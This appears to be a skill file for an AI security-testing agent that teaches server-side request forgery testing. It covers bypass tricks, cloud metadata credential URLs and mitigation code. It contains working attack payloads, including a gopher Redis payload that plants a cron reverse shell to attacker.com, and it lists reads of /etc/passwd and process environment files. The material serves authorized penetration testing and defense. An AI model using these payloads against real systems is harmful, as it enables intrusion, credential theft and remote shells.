---
name: ssrf-testing
description: Professional skills and methodology for server-side request forgery (SSRF) testing
version: 1.0.0
---

# Server-Side Request Forgery (SSRF) Testing

## Overview

Server-Side Request Forgery (SSRF) causes a server to make attacker-controlled requests, potentially accessing internal resources, scanning ports, or bypassing firewalls. This skill covers detection, exploitation, and prevention.

## How the Vulnerability Works

An application accepts a URL and requests it. An attacker who controls the destination may cause:
- Internal resource access
- Local file reads
- Port scanning
- Firewall bypass
- Cloud service metadata access

## Testing Methods

### 1. Identify SSRF Input Points

**Common features:**
- URL previews/screenshots
- File uploads from remote URLs
- Webhook callbacks
- API proxies
- Data imports
- Image processing
- PDF generation

### 2. Basic Detection

**Test loopback addresses:**
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
```

**Test private IP addresses:**
```
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
```

**Test the file protocol:**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
```

### 3. Bypass Techniques

**IP address encoding:**
```
127.0.0.1 → 2130706433 (decimal)
127.0.0.1 → 0x7f000001 (hexadecimal)
127.0.0.1 → 0177.0.0.1 (octal)
```

**DNS resolution bypass:**
```
127.0.0.1.xip.io
127.0.0.1.nip.io
localtest.me
```

**URL redirects:**
```
http://attacker.com/redirect → http://127.0.0.1
```

**Protocol confusion:**
```
http://127.0.0.1:80@evil.com
http://evil.com#@127.0.0.1
```

## Exploitation Techniques

### Internal Network Discovery

**Port scanning:**
```bash
# Use Burp Intruder
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:9200
```

**Identify services:**
- Response timing differences
- Error messages
- HTTP status codes
- Response contents

### Cloud Service Metadata

**AWS EC2：**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Google Cloud：**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

**Azure：**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
```

**Alibaba Cloud:**
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### Internal Application Attacks

**Access admin interfaces:**
```
http://127.0.0.1:8080/admin
http://192.168.1.100/phpmyadmin
```

**Unauthenticated Redis access:**
```
http://127.0.0.1:6379
# Then send Redis commands
```

**FastCGI attack:**
```
http://127.0.0.1:9000
# Execute commands through FastCGI
```

## Advanced Exploitation

### Gopher Protocol

**Send arbitrary protocol data:**
```
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aquit%0d%0a
```

**Redis command execution:**
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

### Dict Protocol

**Port scanning and information gathering:**
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:3306/status
```

### File Protocol

**Read local files:**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///proc/self/environ
```

## Tools

### SSRFmap

```bash
# Basic scan
python3 ssrfmap.py -r request.txt -p url

# Port scanning
python3 ssrfmap.py -r request.txt -p url -m portscan

# Cloud metadata
python3 ssrfmap.py -r request.txt -p url -m cloud
```

### Gopherus

```bash
# Generate a Gopher payload
python gopherus.py --exploit redis
```

### Burp Collaborator

**Detect blind SSRF:**
```
http://burpcollaborator.net
# Watch for DNS/HTTP requests
```

## Verification and Reporting

### Verification Steps

1. Confirm control over the request destination
2. Verify internal resource access or port scanning
3. Assess impact (internal network compromise, data disclosure, etc.)
4. Record the complete proof of concept
5. Record confirmed findings with `report_finding`, the platform's only entry point for findings. Include location, type, severity, reproduction steps/PoC, and remediation guidance

### Report Essentials

- Vulnerability location and input parameters
- Accessible internal resources or ports
- Complete exploitation steps and PoC
- Remediation guidance (URL allowlists, disabling dangerous protocols, etc.)

## Mitigations

### Recommended Approach

1. **URL allowlist**
   ```python
   ALLOWED_DOMAINS = ['example.com', 'cdn.example.com']
   parsed = urlparse(url)
   if parsed.netloc not in ALLOWED_DOMAINS:
       raise ValueError("Domain not allowed")
   ```

2. **Disable dangerous protocols**
   - Allow only http/https
   - Block file://, gopher://, dict://, etc.

3. **IP address filtering**
   ```python
   import ipaddress
   
   def is_internal_ip(ip):
       return ipaddress.ip_address(ip).is_private or \
              ipaddress.ip_address(ip).is_loopback
   ```

4. **DNS resolution validation**
   - Resolve the domain to an IP address
   - Check whether the IP is in a private range

5. **Network isolation**
   - Restrict server outbound access
   - Use a proxy server

## Considerations

- Test only in authorized environments
- Avoid disrupting internal systems
- Account for differences in protocol support
- Watch request frequency to avoid triggering defenses